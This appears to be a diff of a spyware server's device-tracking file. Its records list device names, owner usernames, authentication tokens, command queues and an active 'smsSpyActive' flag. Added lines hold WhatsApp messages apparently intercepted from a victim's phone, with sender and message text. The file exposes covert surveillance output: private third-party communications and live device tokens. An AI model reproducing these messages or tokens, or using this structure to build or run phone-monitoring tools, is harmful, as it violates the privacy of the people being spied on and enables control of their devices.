@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775226465672,
+    "lastSeen": 1775226486681,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -7687,7 +7687,7 @@
     "deviceName": "HP-FREE-E66C",
     "ownerUsername": "rian",
     "token": "7c40312663da19aa0afa5e0005207a47",
-    "lastSeen": 1775226465839,
+    "lastSeen": 1775226486852,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T14:23:08.255Z",
@@ -7703,6 +7703,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "capel",
+        "content": "Joni besar wd: @⁨Saya Orang⁩ baca wa",
+        "time": "03/04 21:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775226488764
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "capel",
+        "content": "Joni besar wd: @⁨Saya Orang⁩ baca wa",
+        "time": "03/04 21:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775226468766
+      },
       {
         "appName": "WhatsApp",
         "sender": "capel: Menyebut Anda",
